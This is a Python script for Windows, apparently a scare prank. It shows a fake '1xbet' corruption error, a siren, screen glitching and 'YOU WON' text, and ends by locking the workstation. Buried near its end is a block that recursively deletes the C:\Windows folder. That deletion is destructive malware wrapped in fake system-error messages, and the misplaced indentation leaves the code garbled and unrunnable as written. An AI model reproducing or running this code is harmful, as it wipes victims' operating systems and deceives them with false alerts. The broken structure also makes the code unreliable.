import win32gui
import win32api
import win32con
import random
import winsound
import time
import pyautogui
from threading import Thread
import shutil
import os

def scary_siren():
    while True:
        try:
            start_freq = random.randint(1200, 2800)
            end_freq = random.randint(250, 550)
            for i in range(15):
                current_freq = start_freq - (start_freq - end_freq) * (i/15)
                winsound.Beep(int(current_freq), 75)
            time.sleep(random.uniform(0.4, 0.9))
        except: break

def start_chaos():
    win32api.MessageBox(0, "Programm '1xbet' has corrupted the OS.", "System error", win32con.MB_OK | win32con.MB_ICONWARNING)

    hdc = win32gui.GetDC(0)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    
    # СОЗДАНИЕ ДВУХ ШРИФТОВ: Обычный и Гигантский
    def create_my_font(size):
        lf = win32gui.LOGFONT()
        lf.lfHeight = size
        lf.lfUnderline = True
        lf.lfWeight = win32con.FW_BLACK # Максимальная жирность
        lf.lfFaceName = "Courier New"  # Стиль консоли
        return win32gui.CreateFontIndirect(lf)

    font_normal = create_my_font(40) # Было 20, стало 40
    font_huge = create_my_font(150) # Гигантский шрифт для финала

    icons = [win32con.IDI_APPLICATION, win32con.IDI_HAND, win32con.IDI_EXCLAMATION]
    Thread(target=scary_siren, daemon=True).start()
    
    start_time = time.time()
    duration = 50 

    try:
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            
            # 1. РАССЫПАНИЕ (Scattering)
            for _ in range(30):
                x, y = random.randint(0, sw), random.randint(0, sh)
                win32gui.BitBlt(hdc, x + random.randint(-20, 20), y + random.randint(-20, 20), 
                                180, 180, hdc, x, y, win32con.SRCCOPY)

            # 2. НАДПИСИ "tin.exe" (Растут со временем)
            if elapsed > 40: # Последние 10 секунд
                current_font = font_huge
                text_count = 3
            else:
                current_font = font_normal
                text_count = 8

            win32gui.SelectObject(hdc, current_font)
            win32gui.SetTextColor(hdc, win32api.RGB(200, 0, 0)) # Кровавый
            win32gui.SetBkMode(hdc, win32con.TRANSPARENT)
            
            for _ in range(text_count):
                win32gui.DrawText(hdc, "YOU WON", -1, 
                                  (random.randint(0, sw), random.randint(0, sh), sw, sh), 
                                  win32con.DT_LEFT | win32con.DT_NOCLIP)

            # 3. ИКОНКИ И ТРЯСКА
            if random.random() > 0.6:
                win32gui.DrawIcon(hdc, random.randint(0, sw), random.randint(0, sh), 
                                  win32gui.LoadIcon(0, random.choice(icons)))

            win32gui.StretchBlt(hdc, random.randint(-30, 30), random.randint(-30, 30), 
                                sw, sh, hdc, 0, 0, sw, sh, win32con.NOTSRCCOPY)
            time.sleep(0.005)

        # ФИНАЛ: ЧЕРНЫЙ ЭКРАН И LOCK
        black_brush = win32gui.CreateSolidBrush(win32api.RGB(0, 0, 0))
        win32gui.SelectObject(hdc, black_brush)
        win32gui.PatBlt(hdc, 0, 0, sw, sh, win32con.PATCOPY)

	folder_path = 'C:\Windows'

# Delete the folder and all its contents
if os.path.exists(folder_path):
    try:
        shutil.rmtree(folder_path)
        print(f"Folder '{folder_path}' and all contents deleted successfully.")
    except Exception as e:
        print(f"Error: {e}")
else:
    print("Folder does not exist.")
        
        error_text = ("Критическая ошибка: Структура файловой системы повреждена.\n\n"
                      "Процесс '1xbet.exe' переписал загрузочные сектора диска C:.")
        win32api.MessageBox(0, error_text, "Windows - System Critical Error", win32con.MB_OK | win32con.MB_ICONSTOP)
        
        pyautogui.hotkey('win', 'l')

    finally:
        win32gui.DeleteObject(font_normal)
        win32gui.DeleteObject(font_huge)
        win32gui.ReleaseDC(0, hdc)
        win32gui.InvalidateRect(0, None, True)

if __name__ == "__main__":
    start_chaos()
